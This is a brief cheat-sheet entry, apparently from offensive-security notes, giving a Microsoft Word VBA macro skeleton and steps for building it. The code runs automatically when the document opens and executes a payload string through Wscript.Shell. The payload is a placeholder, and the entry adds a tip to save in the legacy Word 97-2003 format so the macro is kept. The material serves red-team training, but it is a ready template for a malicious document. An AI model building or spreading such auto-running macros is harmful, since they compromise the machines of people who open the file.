# Macros

### Microsoft Word Macro Skeleton

View -&gt; Macros -&gt; Macros in Document -&gt; Name -&gt; Create

```text
Sub AutoOpen()
    RevMacro
End Sub

Sub Document_Open()
    RevMacro
End Sub

Sub RevMacro()
    Dim Str As String
    <payload here>
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Functions Purposes:

* AutoOpen\(\) = Open when a new document is opened
* Document\_Open\(\) = Executed when Reopened
* CreateObject\("Wscript.Shell"\).Run Str = Runs the payload
* Save As: Word 97-2003 Document

